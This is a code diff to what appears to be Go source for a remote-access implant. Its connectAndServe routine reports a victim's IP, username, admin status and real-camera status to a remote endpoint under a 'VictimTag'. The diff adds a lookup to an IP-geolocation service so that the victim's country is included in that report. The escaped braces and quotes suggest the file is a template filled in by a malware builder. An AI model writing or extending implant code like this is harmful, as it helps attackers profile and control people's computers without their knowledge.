@@ -212,6 +212,25 @@ func getAdminStatus() bool {{
 	return err == nil
 }}
 
+
+func userCountry() string {{
+	resp, err := http.Get(""https://ipwho.is/"")
+	if err != nil {{
+		return """"
+	}}
+	defer resp.Body.Close()
+
+	var data struct {{
+		Country string `json:""country""`
+	}}
+
+	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {{
+		return """"
+	}}
+
+	return data.Country
+}}
+
 func getCameraStatus() bool {{
     script := ""$virtual = @('virtual','obs','ndi','manycam','droidcam','screen capture'); "" +
         ""$devices = Get-PnpDevice -Class Camera -Status OK -ErrorAction SilentlyContinue; "" +
@@ -444,7 +463,7 @@ func connectAndServe(ctx context.Context, endpoint string) error {{
         UserIPAddress:    GetUserIp(),
         VictimTag:        ""{tag}"",
         Username:         usernameOrDefault(),
-        Country:          ""Unknown"",
+        Country:          userCountry(),
         UserOS:           runtimeName(),
         AdminStatus:      getAdminStatus(),
         CameraStatus:     getCameraStatus(),
